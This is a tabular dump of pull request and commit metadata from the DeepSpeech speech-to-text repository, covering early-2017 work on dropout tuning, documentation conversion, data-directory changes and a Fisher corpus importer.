3993,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bd6f7b46497571ec0f311d579c60bab678267751,Merge remote-tracking branch 'upstream/master' into wer-update
3994,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9cdada29594514339a12302b7f55e0c76f00714f,"Merge pull request #191 from lissyx/wer-update

Wer update"
3995,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dc1cc94b3019d0926b0b6f2673a5ec8abab86d44,Merge remote-tracking branch 'upstream/master' into wer-update
3996,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,59182ed32ae9fac4ea82708c6f0b8c78c2f841d9,"Merge pull request #206 from lissyx/wer-update

Wer update"
3997,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5ffa079525ddf4c842737f18b96d6feb7b5448d7,Merge remote-tracking branch 'upstream/master' into wer-update
3998,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,573079c47a10d4ceccf0d4242e06b61cb5f93ffd,"Merge pull request #214 from lissyx/wer-update

Wer update"
3999,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0662ceb038fcda45fdb363d9fa5a201b7e8c07e6,Merge remote-tracking branch 'upstream/master' into wer-update
4000,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,85bf45fe1eb7446d2ef45fa834d04884892066b5,"Merge pull request #223 from lissyx/wer-update

Wer update"
4001,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2b90844f95af659b1ba7620ca80d7977913f463c,Merge remote-tracking branch 'upstream/master' into wer-update
4002,https://api.github.com/repos/mozilla/DeepSpeech/pulls/376,376,Move big data write to /data,"Touching both TMP= and forcing CKPT_BASE_DIR to be on /data

Fixes #374",lissyx,1645737,2017-02-13T11:21:41Z,COLLABORATOR,True,16,5,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2f63b2e89a1833ac9735e2c7efe1ef84ec5143b8,"Move some data to be stored on /data

Settting temp directory to be in /data, and DATA_DIR to /data,
defaulting to XDG_DATA_HOME.

Fixes #374"
4003,https://api.github.com/repos/mozilla/DeepSpeech/pulls/371,371,"Make dropout configurable per-layer, fixes #372",,Cwiiis,668518,2017-02-10T13:36:16Z,CONTRIBUTOR,True,30,7,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,523e414234b04534ead3a05606bd8f42ec2b3932,Make dropout configurable per-layer
4004,https://api.github.com/repos/mozilla/DeepSpeech/pulls/370,370,Next step in binary search for optimal dropout,,kdavis-mozilla,12054740,2017-02-10T11:48:57Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,94aa5ba6674e4770162e8f02323da7ec88daa9cf,Fix #368
4005,https://api.github.com/repos/mozilla/DeepSpeech/pulls/370,370,Next step in binary search for optimal dropout,,kdavis-mozilla,12054740,2017-02-10T11:48:57Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d8856a94c83a92cbba01d2ae4b4fd17a84cb520c,"Merge pull request #369 from mozilla/issue368

Fix #368"
4006,https://api.github.com/repos/mozilla/DeepSpeech/pulls/369,369,Fix #368,,kdavis-mozilla,12054740,2017-02-10T11:47:25Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,94aa5ba6674e4770162e8f02323da7ec88daa9cf,Fix #368
4007,https://api.github.com/repos/mozilla/DeepSpeech/pulls/359,359,Refactor and dropout to 25%,,kdavis-mozilla,12054740,2017-02-05T07:19:38Z,CONTRIBUTOR,True,1819,2043,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7f5420c33782ebe551c3fed0072d3d0234a261d3,Convert notebook to script
4008,https://api.github.com/repos/mozilla/DeepSpeech/pulls/359,359,Refactor and dropout to 25%,,kdavis-mozilla,12054740,2017-02-05T07:19:38Z,CONTRIBUTOR,True,1819,2043,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,57b2dc52e639bebb9854b1e8950bde35d8694356,Inline and clean up comments from converted script
4009,https://api.github.com/repos/mozilla/DeepSpeech/pulls/359,359,Refactor and dropout to 25%,,kdavis-mozilla,12054740,2017-02-05T07:19:38Z,CONTRIBUTOR,True,1819,2043,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,88f0e3543b521ea831ccab4f94d4777d3230fe75,Add extended documentation to doc/ directory
4010,https://api.github.com/repos/mozilla/DeepSpeech/pulls/359,359,Refactor and dropout to 25%,,kdavis-mozilla,12054740,2017-02-05T07:19:38Z,CONTRIBUTOR,True,1819,2043,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fe1abe90cc1a6c6b8af856489039d27284605922,Math support for markdown documents
4011,https://api.github.com/repos/mozilla/DeepSpeech/pulls/359,359,Refactor and dropout to 25%,,kdavis-mozilla,12054740,2017-02-05T07:19:38Z,CONTRIBUTOR,True,1819,2043,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,de6a35ac429fa080953a2eac46570ef20fc9986f,Update README.md
4012,https://api.github.com/repos/mozilla/DeepSpeech/pulls/359,359,Refactor and dropout to 25%,,kdavis-mozilla,12054740,2017-02-05T07:19:38Z,CONTRIBUTOR,True,1819,2043,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dc13d4be0691fbeae9a3a43f6632a56a1022c77e,Remove readme2tex infrastructure
4013,https://api.github.com/repos/mozilla/DeepSpeech/pulls/359,359,Refactor and dropout to 25%,,kdavis-mozilla,12054740,2017-02-05T07:19:38Z,CONTRIBUTOR,True,1819,2043,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0a1d3d49ca9d405a15e584e53b3581bc1c016a2e,Make DeepSpeech.py importable without side-effects
4014,https://api.github.com/repos/mozilla/DeepSpeech/pulls/359,359,Refactor and dropout to 25%,,kdavis-mozilla,12054740,2017-02-05T07:19:38Z,CONTRIBUTOR,True,1819,2043,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,56eee9adaf17fcd68a1eaf5e9249a07aba57d9a3,Convert documentation to Sphinx RST
4015,https://api.github.com/repos/mozilla/DeepSpeech/pulls/359,359,Refactor and dropout to 25%,,kdavis-mozilla,12054740,2017-02-05T07:19:38Z,CONTRIBUTOR,True,1819,2043,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d6fb444287fe0130d9c60ce41bcd07475c4a10cc,Convert code comments to Sphinx RST docstrings
4016,https://api.github.com/repos/mozilla/DeepSpeech/pulls/359,359,Refactor and dropout to 25%,,kdavis-mozilla,12054740,2017-02-05T07:19:38Z,CONTRIBUTOR,True,1819,2043,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,af8d3ed675d78cf5f84e99b63c292e42f8a636ac,"Add Sphinx configuration files, documentation index and makefiles"
4017,https://api.github.com/repos/mozilla/DeepSpeech/pulls/359,359,Refactor and dropout to 25%,,kdavis-mozilla,12054740,2017-02-05T07:19:38Z,CONTRIBUTOR,True,1819,2043,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ee50d82f8c43511b7d5e0f5e9392dc56134255cb,Add requirements.txt so readthedocs.org can import our code
4018,https://api.github.com/repos/mozilla/DeepSpeech/pulls/359,359,Refactor and dropout to 25%,,kdavis-mozilla,12054740,2017-02-05T07:19:38Z,CONTRIBUTOR,True,1819,2043,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ceaccce578e5f44782e34502c8fb2dbf10c47885,Add back this piece of documentation previously removed from README
4019,https://api.github.com/repos/mozilla/DeepSpeech/pulls/359,359,Refactor and dropout to 25%,,kdavis-mozilla,12054740,2017-02-05T07:19:38Z,CONTRIBUTOR,True,1819,2043,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dad0b53a3b97c167ee2633e24958dee52407d8ee,Add missing math contexts in DeepSpeech.rst
4020,https://api.github.com/repos/mozilla/DeepSpeech/pulls/359,359,Refactor and dropout to 25%,,kdavis-mozilla,12054740,2017-02-05T07:19:38Z,CONTRIBUTOR,True,1819,2043,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2c832169de49e554000ba049c1d1c80f0795e5ea,"Merge pull request #352 from mozilla/issue313_update

Notebook decomposition PR, updated"
4021,https://api.github.com/repos/mozilla/DeepSpeech/pulls/359,359,Refactor and dropout to 25%,,kdavis-mozilla,12054740,2017-02-05T07:19:38Z,CONTRIBUTOR,True,1819,2043,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,48b43d1ee6df1314526ae5959238c9d24a7520d2,Mention documentation and include readthedocs badge in README.md
4022,https://api.github.com/repos/mozilla/DeepSpeech/pulls/359,359,Refactor and dropout to 25%,,kdavis-mozilla,12054740,2017-02-05T07:19:38Z,CONTRIBUTOR,True,1819,2043,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,06ad0d802677f5d8deca8dc24762167951f3050d,"Merge pull request #356 from mozilla/reuben-docs-badge-1

Mention documentation and include readthedocs badge in README.md"
4023,https://api.github.com/repos/mozilla/DeepSpeech/pulls/359,359,Refactor and dropout to 25%,,kdavis-mozilla,12054740,2017-02-05T07:19:38Z,CONTRIBUTOR,True,1819,2043,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a8c473d00b2f750a7b861ca1b17b1a83f030eff2,Fix #357
4024,https://api.github.com/repos/mozilla/DeepSpeech/pulls/359,359,Refactor and dropout to 25%,,kdavis-mozilla,12054740,2017-02-05T07:19:38Z,CONTRIBUTOR,True,1819,2043,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e39f7cfe2773e70aea65c9ec6309e574c839afc4,"Merge pull request #358 from mozilla/issue357

Fix #357"
4025,https://api.github.com/repos/mozilla/DeepSpeech/pulls/358,358,Fix #357,,kdavis-mozilla,12054740,2017-02-05T07:18:40Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a8c473d00b2f750a7b861ca1b17b1a83f030eff2,Fix #357
4026,https://api.github.com/repos/mozilla/DeepSpeech/pulls/356,356,Mention documentation and include readthedocs badge in README.md,,reuben,477142,2017-02-03T11:31:30Z,MEMBER,True,5,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,48b43d1ee6df1314526ae5959238c9d24a7520d2,Mention documentation and include readthedocs badge in README.md
4027,https://api.github.com/repos/mozilla/DeepSpeech/pulls/352,352,"Notebook decomposition PR, updated","First I regenerated the script with jupyter-nbconvert, then I re-applied Tilman's changes to inline and reformat comments, sort imports, things like that. Then I cherry-picked his math support commit to the branch, and finally updated the README.",reuben,477142,2017-01-28T20:48:23Z,MEMBER,True,1813,2041,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7f5420c33782ebe551c3fed0072d3d0234a261d3,Convert notebook to script
4028,https://api.github.com/repos/mozilla/DeepSpeech/pulls/352,352,"Notebook decomposition PR, updated","First I regenerated the script with jupyter-nbconvert, then I re-applied Tilman's changes to inline and reformat comments, sort imports, things like that. Then I cherry-picked his math support commit to the branch, and finally updated the README.",reuben,477142,2017-01-28T20:48:23Z,MEMBER,True,1813,2041,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,57b2dc52e639bebb9854b1e8950bde35d8694356,Inline and clean up comments from converted script
4029,https://api.github.com/repos/mozilla/DeepSpeech/pulls/352,352,"Notebook decomposition PR, updated","First I regenerated the script with jupyter-nbconvert, then I re-applied Tilman's changes to inline and reformat comments, sort imports, things like that. Then I cherry-picked his math support commit to the branch, and finally updated the README.",reuben,477142,2017-01-28T20:48:23Z,MEMBER,True,1813,2041,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,88f0e3543b521ea831ccab4f94d4777d3230fe75,Add extended documentation to doc/ directory
4030,https://api.github.com/repos/mozilla/DeepSpeech/pulls/352,352,"Notebook decomposition PR, updated","First I regenerated the script with jupyter-nbconvert, then I re-applied Tilman's changes to inline and reformat comments, sort imports, things like that. Then I cherry-picked his math support commit to the branch, and finally updated the README.",reuben,477142,2017-01-28T20:48:23Z,MEMBER,True,1813,2041,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fe1abe90cc1a6c6b8af856489039d27284605922,Math support for markdown documents
4031,https://api.github.com/repos/mozilla/DeepSpeech/pulls/352,352,"Notebook decomposition PR, updated","First I regenerated the script with jupyter-nbconvert, then I re-applied Tilman's changes to inline and reformat comments, sort imports, things like that. Then I cherry-picked his math support commit to the branch, and finally updated the README.",reuben,477142,2017-01-28T20:48:23Z,MEMBER,True,1813,2041,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,de6a35ac429fa080953a2eac46570ef20fc9986f,Update README.md
4032,https://api.github.com/repos/mozilla/DeepSpeech/pulls/352,352,"Notebook decomposition PR, updated","First I regenerated the script with jupyter-nbconvert, then I re-applied Tilman's changes to inline and reformat comments, sort imports, things like that. Then I cherry-picked his math support commit to the branch, and finally updated the README.",reuben,477142,2017-01-28T20:48:23Z,MEMBER,True,1813,2041,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dc13d4be0691fbeae9a3a43f6632a56a1022c77e,Remove readme2tex infrastructure
4033,https://api.github.com/repos/mozilla/DeepSpeech/pulls/352,352,"Notebook decomposition PR, updated","First I regenerated the script with jupyter-nbconvert, then I re-applied Tilman's changes to inline and reformat comments, sort imports, things like that. Then I cherry-picked his math support commit to the branch, and finally updated the README.",reuben,477142,2017-01-28T20:48:23Z,MEMBER,True,1813,2041,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0a1d3d49ca9d405a15e584e53b3581bc1c016a2e,Make DeepSpeech.py importable without side-effects
4034,https://api.github.com/repos/mozilla/DeepSpeech/pulls/352,352,"Notebook decomposition PR, updated","First I regenerated the script with jupyter-nbconvert, then I re-applied Tilman's changes to inline and reformat comments, sort imports, things like that. Then I cherry-picked his math support commit to the branch, and finally updated the README.",reuben,477142,2017-01-28T20:48:23Z,MEMBER,True,1813,2041,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,56eee9adaf17fcd68a1eaf5e9249a07aba57d9a3,Convert documentation to Sphinx RST
4035,https://api.github.com/repos/mozilla/DeepSpeech/pulls/352,352,"Notebook decomposition PR, updated","First I regenerated the script with jupyter-nbconvert, then I re-applied Tilman's changes to inline and reformat comments, sort imports, things like that. Then I cherry-picked his math support commit to the branch, and finally updated the README.",reuben,477142,2017-01-28T20:48:23Z,MEMBER,True,1813,2041,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d6fb444287fe0130d9c60ce41bcd07475c4a10cc,Convert code comments to Sphinx RST docstrings
4036,https://api.github.com/repos/mozilla/DeepSpeech/pulls/352,352,"Notebook decomposition PR, updated","First I regenerated the script with jupyter-nbconvert, then I re-applied Tilman's changes to inline and reformat comments, sort imports, things like that. Then I cherry-picked his math support commit to the branch, and finally updated the README.",reuben,477142,2017-01-28T20:48:23Z,MEMBER,True,1813,2041,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,af8d3ed675d78cf5f84e99b63c292e42f8a636ac,"Add Sphinx configuration files, documentation index and makefiles"
4037,https://api.github.com/repos/mozilla/DeepSpeech/pulls/352,352,"Notebook decomposition PR, updated","First I regenerated the script with jupyter-nbconvert, then I re-applied Tilman's changes to inline and reformat comments, sort imports, things like that. Then I cherry-picked his math support commit to the branch, and finally updated the README.",reuben,477142,2017-01-28T20:48:23Z,MEMBER,True,1813,2041,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ee50d82f8c43511b7d5e0f5e9392dc56134255cb,Add requirements.txt so readthedocs.org can import our code
4038,https://api.github.com/repos/mozilla/DeepSpeech/pulls/352,352,"Notebook decomposition PR, updated","First I regenerated the script with jupyter-nbconvert, then I re-applied Tilman's changes to inline and reformat comments, sort imports, things like that. Then I cherry-picked his math support commit to the branch, and finally updated the README.",reuben,477142,2017-01-28T20:48:23Z,MEMBER,True,1813,2041,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ceaccce578e5f44782e34502c8fb2dbf10c47885,Add back this piece of documentation previously removed from README
4039,https://api.github.com/repos/mozilla/DeepSpeech/pulls/352,352,"Notebook decomposition PR, updated","First I regenerated the script with jupyter-nbconvert, then I re-applied Tilman's changes to inline and reformat comments, sort imports, things like that. Then I cherry-picked his math support commit to the branch, and finally updated the README.",reuben,477142,2017-01-28T20:48:23Z,MEMBER,True,1813,2041,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dad0b53a3b97c167ee2633e24958dee52407d8ee,Add missing math contexts in DeepSpeech.rst
4040,https://api.github.com/repos/mozilla/DeepSpeech/pulls/351,351,Lower dropout from 40% to 30%,,kdavis-mozilla,12054740,2017-01-28T07:17:42Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c5211d84c362a55b4194d3496837bda3d278e8d4,Fix #349
4041,https://api.github.com/repos/mozilla/DeepSpeech/pulls/351,351,Lower dropout from 40% to 30%,,kdavis-mozilla,12054740,2017-01-28T07:17:42Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,55e312ffe556b23f35d2b69bb64bf91768392a13,"Merge pull request #350 from mozilla/issue349

Fix #349"
4042,https://api.github.com/repos/mozilla/DeepSpeech/pulls/350,350,Fix #349,,kdavis-mozilla,12054740,2017-01-28T07:16:22Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c5211d84c362a55b4194d3496837bda3d278e8d4,Fix #349
4043,https://api.github.com/repos/mozilla/DeepSpeech/pulls/348,348,Increased dropout to 40%,,kdavis-mozilla,12054740,2017-01-23T05:25:38Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,67c48d252a7df7481817171772183af4412d4958,Fixed #346
4044,https://api.github.com/repos/mozilla/DeepSpeech/pulls/348,348,Increased dropout to 40%,,kdavis-mozilla,12054740,2017-01-23T05:25:38Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7f77061d68d0cc3ae33a228c1595c9a2fabbaca2,"Merge pull request #347 from mozilla/issue346

Fixed #346"
4045,https://api.github.com/repos/mozilla/DeepSpeech/pulls/347,347,Fixed #346,,kdavis-mozilla,12054740,2017-01-23T05:24:39Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,67c48d252a7df7481817171772183af4412d4958,Fixed #346
4046,https://api.github.com/repos/mozilla/DeepSpeech/pulls/345,345,Fix #332; Implemented IRC bot,,tilmankamp,5991088,2017-01-20T20:04:20Z,CONTRIBUTOR,False,366,0,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,46491c154a11f7b8fd97a10b10c369123f08a719,Fix #332; Added IRC bot for epoch notification
4047,https://api.github.com/repos/mozilla/DeepSpeech/pulls/345,345,Fix #332; Implemented IRC bot,,tilmankamp,5991088,2017-01-20T20:04:20Z,CONTRIBUTOR,False,366,0,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4148bddf4cb29ec923fe421a9df76f5b3f80807f,Better statistics support
4048,https://api.github.com/repos/mozilla/DeepSpeech/pulls/343,343,Fixed #340,,kdavis-mozilla,12054740,2017-01-16T12:37:42Z,CONTRIBUTOR,True,71,20,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0f8242ad3949be8cffd7ba145864e5852f37be2e,Fixed #340
4049,https://api.github.com/repos/mozilla/DeepSpeech/pulls/343,343,Fixed #340,,kdavis-mozilla,12054740,2017-01-16T12:37:42Z,CONTRIBUTOR,True,71,20,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e91262110055396243f51e9b8250b8d29ba769c3,Addressed review comments
4050,https://api.github.com/repos/mozilla/DeepSpeech/pulls/343,343,Fixed #340,,kdavis-mozilla,12054740,2017-01-16T12:37:42Z,CONTRIBUTOR,True,71,20,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,22b2d67a765fe3504c412d6376f560c3f73b3d97,"Merge pull request #342 from mozilla/issue340

Fixed #340"
4051,https://api.github.com/repos/mozilla/DeepSpeech/pulls/342,342,Fixed #340,"Properly stopped all Python Threads on all possible transitions:

* training-to-validation
* validation-to-training
* validation-to-testing
* training-to-testing

using a [tf.train.Coordinator](https://www.tensorflow.org/api_docs/python/train/coordinator_and_queuerunner#Coordinator).

The newly documented means of employing a [tf.train.Coordinator](https://www.tensorflow.org/api_docs/python/train/coordinator_and_queuerunner#Coordinator) to stop Python Threads internal or external to [QueueRunner](https://www.tensorflow.org/how_tos/threading_and_queues/#queuerunner)'s was employed.",kdavis-mozilla,12054740,2017-01-16T08:57:10Z,CONTRIBUTOR,True,71,20,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0f8242ad3949be8cffd7ba145864e5852f37be2e,Fixed #340
4052,https://api.github.com/repos/mozilla/DeepSpeech/pulls/342,342,Fixed #340,"Properly stopped all Python Threads on all possible transitions:

* training-to-validation
* validation-to-training
* validation-to-testing
* training-to-testing

using a [tf.train.Coordinator](https://www.tensorflow.org/api_docs/python/train/coordinator_and_queuerunner#Coordinator).

The newly documented means of employing a [tf.train.Coordinator](https://www.tensorflow.org/api_docs/python/train/coordinator_and_queuerunner#Coordinator) to stop Python Threads internal or external to [QueueRunner](https://www.tensorflow.org/how_tos/threading_and_queues/#queuerunner)'s was employed.",kdavis-mozilla,12054740,2017-01-16T08:57:10Z,CONTRIBUTOR,True,71,20,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e91262110055396243f51e9b8250b8d29ba769c3,Addressed review comments
4053,https://api.github.com/repos/mozilla/DeepSpeech/pulls/338,338,Increase of dropout to battle overfitting,,kdavis-mozilla,12054740,2017-01-07T08:38:23Z,CONTRIBUTOR,True,770,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c7eaf9939b1ec6f9688fcadda0a26001969f9907,Implement Fisher corpus importer
4054,https://api.github.com/repos/mozilla/DeepSpeech/pulls/338,338,Increase of dropout to battle overfitting,,kdavis-mozilla,12054740,2017-01-07T08:38:23Z,CONTRIBUTOR,True,770,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d8aaffce620c35b55c65e840ddb3a67f8c2fbd68,Address review comments and do further filtering and cleanup on the transcription data
4055,https://api.github.com/repos/mozilla/DeepSpeech/pulls/338,338,Increase of dropout to battle overfitting,,kdavis-mozilla,12054740,2017-01-07T08:38:23Z,CONTRIBUTOR,True,770,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a40df7251e10dbf3d7143ecaed7c6bc4666850fe,Convert each channel individually before splitting wav files
4056,https://api.github.com/repos/mozilla/DeepSpeech/pulls/338,338,Increase of dropout to battle overfitting,,kdavis-mozilla,12054740,2017-01-07T08:38:23Z,CONTRIBUTOR,True,770,29,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e7bbfbf703b82bee83cb60265ae67f337cbc3f00,Convert Fisher importer to new input system
